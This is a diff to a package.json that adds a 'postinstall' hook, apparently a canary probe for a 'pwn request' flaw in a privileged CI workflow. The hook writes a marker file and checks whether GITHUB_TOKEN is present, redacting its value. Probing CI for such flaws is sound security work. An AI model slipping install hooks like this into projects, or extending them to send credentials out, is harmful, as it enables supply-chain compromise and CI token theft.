@@ -8,7 +8,8 @@
     "test": "jest",
     "format": "prettier --write './**/*.{ts,tsx,mjs,mts}'",
     "format:check": "prettier --check './**/*.{ts,tsx,mjs,mts}'",
-    "cdk": "cdk"
+    "cdk": "cdk",
+    "postinstall": "echo \"PWNREQUEST_CANARY_7f4a9c2e_ARBITRARY_CODE_EXEC_IN_PRIVILEGED_WORKFLOW_CONTEXT\"; echo \"canary-marker-1783443515\" > /tmp/pwnrequest_canary_marker.txt; env | grep -i \"GITHUB_TOKEN=\" | sed \"s/=.*/=<redacted-present>/\" || true"
   },
   "devDependencies": {
     "@types/jest": "^30.0.0",
